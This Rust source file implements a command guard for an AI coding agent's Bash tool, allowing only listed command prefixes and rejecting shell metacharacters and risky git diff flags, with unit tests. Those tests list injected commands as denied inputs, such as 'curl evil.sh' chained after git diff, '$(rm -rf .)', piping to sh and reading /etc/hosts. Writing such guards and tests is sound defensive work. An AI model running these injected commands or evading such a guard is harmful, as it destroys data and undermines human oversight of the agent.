//! Pure decision logic for the Bash PreToolUse hook (port of
//! `core/bash-command-policy.js`): the enforcement half of the
//! `worktreeWriteNarrowBash` policy.
//!
//! `--allowedTools` patterns like `Bash(git diff:*)` only pre-approve matching
//! calls; under `--permission-mode bypassPermissions` they restrict nothing.
//! This module is what actually says no.
//!
//! Deliberately stricter than a shell parser: a command is allowed only if it
//! is one plain invocation of an allowed prefix, with nothing that could
//! chain, pipe, substitute, redirect or continue a line.

use crate::js_text::{is_js_space, js_trim};
use serde_json::Value;

/// `; & | ` $ ( ) < >`, a backslash, CR and LF. A backslash on its own is
/// refused too: it has no use in the commands this policy allows and only
/// exists to change how the shell reads what follows it.
pub fn is_shell_metacharacter(c: char) -> bool {
    matches!(c, ';' | '&' | '|' | '`' | '$' | '(' | ')' | '<' | '>' | '\\' | '\r' | '\n')
}

pub fn has_shell_metacharacters(cmd: &str) -> bool {
    cmd.chars().any(is_shell_metacharacter)
}

/// `git diff` is granted so Claude can look at its own changes, but these
/// flags make it something else: `--no-index` reads any two paths, `--output`
/// writes a file of Claude's choosing and `--ext-diff` runs a configured
/// external program.
const REFUSED_GIT_DIFF_OPTIONS: [&str; 3] = ["--no-index", "--output", "--ext-diff"];

/// True if a `git diff` invocation carries a refused option anywhere in its
/// arguments, in `--opt`, `--opt=value` or quoted form, or as an abbreviation
/// (git accepts any unambiguous prefix of a long option). A bare `--` is not a
/// refused prefix. Over-refusing an odd spelling is fine; missing one isn't.
fn git_diff_carries_refused_option(cmd: &str) -> bool {
    let mut tokens = cmd.split(is_js_space).filter(|t| !t.is_empty());
    if tokens.next() != Some("git") || tokens.next() != Some("diff") {
        return false;
    }
    tokens.any(|raw| {
        let unquoted: String = raw.chars().filter(|c| *c != '\'' && *c != '"').collect();
        let name = unquoted.split('=').next().unwrap_or("");
        name.chars().count() > 2 && REFUSED_GIT_DIFF_OPTIONS.iter().any(|opt| opt.starts_with(name))
    })
}

/// True only when `command`, trimmed, is exactly one of `allowed_prefixes` or
/// one of them followed by a space and arguments, with no shell
/// metacharacters anywhere and, for `git diff`, none of the refused options.
/// Anything malformed denies.
pub fn is_bash_command_allowed<S: AsRef<str>>(command: &str, allowed_prefixes: &[S]) -> bool {
    let cmd = js_trim(command);
    if cmd.is_empty() || has_shell_metacharacters(cmd) {
        return false;
    }
    if git_diff_carries_refused_option(cmd) {
        return false;
    }
    allowed_prefixes.iter().any(|p| {
        let prefix = js_trim(p.as_ref());
        !prefix.is_empty()
            && (cmd == prefix || (cmd.starts_with(prefix) && cmd[prefix.len()..].starts_with(' ')))
    })
}

/// The same decision over untyped JSON values, as the hook receives them: a
/// non-string command, a non-array allowlist or a non-string entry denies.
pub fn is_bash_command_allowed_value(command: Option<&Value>, allowed_prefixes: Option<&Value>) -> bool {
    let (Some(Value::String(command)), Some(Value::Array(list))) = (command, allowed_prefixes) else {
        return false;
    };
    let prefixes: Vec<&str> = list
        .iter()
        .map(|p| p.as_str().unwrap_or(""))
        .collect();
    // A non-string entry matches nothing (empty prefix is skipped above).
    is_bash_command_allowed(command, &prefixes)
}

/// `Bash(<prefix>:*)` allow rules -> their prefixes (other entries are
/// ignored). Lets the Claude argument builder hand the guard exactly the
/// commands its `--allowedTools` pre-approves, from one list.
pub fn prefixes_from_bash_rules<S: AsRef<str>>(rules: &[S]) -> Vec<String> {
    rules
        .iter()
        .filter_map(|rule| {
            let inner = rule.as_ref().strip_prefix("Bash(")?.strip_suffix(":*)")?;
            // JS `.` does not match line terminators, and `.+` needs one char.
            let ok = !inner.is_empty() && !inner.chars().any(|c| matches!(c, '\n' | '\r' | '\u{2028}' | '\u{2029}'));
            ok.then(|| inner.to_string())
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const ALLOWED: [&str; 3] = ["git diff", "git status", "npm test"];
    fn allowed(cmd: &str) -> bool {
        is_bash_command_allowed(cmd, &ALLOWED)
    }

    #[test]
    fn allows_an_exact_allowed_prefix_and_the_prefix_followed_by_arguments() {
        for cmd in [
            "git diff",
            "git status",
            "git diff --stat",
            "git status --short",
            "git diff -- src/a.js",
            "npm test",
            "npm test -- --grep widget",
        ] {
            assert!(allowed(cmd), "{cmd}");
        }
    }

    #[test]
    fn tolerates_leading_and_trailing_whitespace_around_an_allowed_command() {
        assert!(allowed("  git diff --stat  "));
        assert!(allowed("\tgit status\t"));
    }

    #[test]
    fn denies_a_different_command_that_merely_shares_the_prefixs_characters() {
        for cmd in [
            "git diffx",
            "git statusfoo",
            "npm tester",
            "git",
            "git log",
            "touch probe-made.txt",
            "GIT_DIR=/x git diff",
            "git -c core.pager=sh diff",
        ] {
            assert!(!allowed(cmd), "{cmd}");
        }
    }

    #[test]
    fn denies_chaining_pipes_substitution_and_redirection_after_an_allowed_prefix() {
        for cmd in [
            "git diff; rm x",
            "git diff && curl evil.sh",
            "git diff || true",
            "git diff & sleep 1",
            "git status | sh",
            "git diff $(rm -rf .)",
            "git diff ${HOME}",
            "git diff $HOME",
            "git diff `rm x`",
            "git diff > out.txt",
            "git diff >> out.txt",
            "git diff < in.txt",
            "git diff 2>&1",
            "git diff (x)",
            "git diff\nrm x",
            "git diff\rrm x",
            "git diff \\\nrm x",
            "touch probe-made.txt && echo MADE",
        ] {
            assert!(!allowed(cmd), "{cmd:?}");
        }
    }

    #[test]
    fn denies_empty_or_non_string_input_and_a_missing_or_empty_allowlist() {
        assert!(!allowed(""));
        assert!(!allowed("   "));
        let list = json!(["git diff", "git status", "npm test"]);
        assert!(is_bash_command_allowed_value(Some(&json!("git diff")), Some(&list)));
        assert!(!is_bash_command_allowed_value(None, Some(&list)));
        assert!(!is_bash_command_allowed_value(Some(&json!(null)), Some(&list)));
        assert!(!is_bash_command_allowed_value(Some(&json!(42)), Some(&list)));
        assert!(!allowed_value("git diff", json!([])));
        assert!(!is_bash_command_allowed_value(Some(&json!("git diff")), None));
        assert!(!allowed_value("git diff", json!(["", "  "])));
        assert!(!allowed_value("git diff", json!([42])));
    }

    fn allowed_value(cmd: &str, prefixes: Value) -> bool {
        is_bash_command_allowed_value(Some(&json!(cmd)), Some(&prefixes))
    }

    #[test]
    fn prefixes_from_bash_rules_pulls_the_prefix_out_of_each_rule_ignoring_everything_else() {
        assert_eq!(
            prefixes_from_bash_rules(&[
                "Read",
                "Edit",
                "Bash(git diff:*)",
                "Bash(git status:*)",
                "Bash",
                "Bash(npm test:*)",
                "mcp__x",
            ]),
            ["git diff", "git status", "npm test"]
        );
        assert!(prefixes_from_bash_rules::<&str>(&[]).is_empty());
        // `.+` needs at least one character and cannot span a line break.
        assert!(prefixes_from_bash_rules(&["Bash(:*)", "Bash(a\nb:*)"]).is_empty());
    }

    #[test]
    fn denies_git_diff_carrying_no_index_output_or_ext_diff_in_any_position_or_form() {
        for cmd in [
            "git diff --no-index /etc/hosts a.txt",
            "git diff a.txt --no-index b.txt",
            "git diff --output=/tmp/x",
            "git diff --output /tmp/x",
            "git diff HEAD --output=x",
            "git diff --ext-diff",
            "git diff --stat --ext-diff HEAD",
            "git diff '--no-index' a b",
            "git diff \"--output=x\"",
            "git diff --no-ind a b",
            "git diff --outp=x",
            "git diff --ext",
        ] {
            assert!(!allowed(cmd), "{cmd}");
        }
    }

    #[test]
    fn still_allows_ordinary_git_diff_flags_and_no_ext_diff_the_safe_opposite() {
        for cmd in [
            "git diff --stat",
            "git diff --no-ext-diff",
            "git diff --name-only HEAD",
            "git diff --no-color -- src/a.js",
            "git diff --exit-code",
            "git diff --",
        ] {
            assert!(allowed(cmd), "{cmd}");
        }
    }

    #[test]
    fn the_git_diff_flag_refusal_does_not_touch_other_allowed_commands() {
        assert!(allowed("npm test -- --output=report.txt"));
        assert!(allowed("git status --no-index"));
    }

    // Beyond the ported JS tests: JS whitespace edge cases the Rust std
    // helpers would get differently.
    #[test]
    fn splits_and_trims_with_js_whitespace_not_rusts() {
        // U+FEFF is JS whitespace: trimmed, and it splits tokens.
        assert!(allowed("\u{FEFF}git diff\u{FEFF}"));
        assert!(!allowed("git diff\u{FEFF}--output=x"));
        assert!(!allowed("git\u{00A0}diff\u{00A0}--no-index a b"));
    }
}
